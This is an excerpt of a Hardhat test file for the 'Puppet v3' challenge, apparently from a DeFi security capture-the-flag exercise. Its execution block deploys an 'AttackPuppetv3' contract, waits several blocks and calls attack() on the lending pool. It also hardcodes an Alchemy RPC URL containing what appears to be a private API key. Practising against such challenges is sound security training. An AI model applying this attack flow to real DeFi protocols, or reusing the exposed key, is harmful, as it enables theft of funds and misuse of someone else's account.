...
describe('[Challenge] Puppet v3', function () {
  ...
  /** SET RPC URL HERE */
  const MAINNET_FORKING_URL = 'https://eth-mainnet.g.alchemy.com/v2/KKqfT3Aidl4-UyjwykUsZyhjhiQuXyuG';
  ...
  it('Execution', async function () {
    ...
    const attackContractAddr = ethers.utils.getContractAddress({
      from: player.address,
      nonce: await player.getTransactionCount(),
    });
    await token.transfer(attackContractAddr, PLAYER_INITIAL_TOKEN_BALANCE);
    const attackContract = await (await ethers.getContractFactory('AttackPuppetv3', player)).deploy(token.address);

    await time.increase(12 * 8); //8 blocks
    await attackContract.attack(token.address, lendingPool.address);
  });
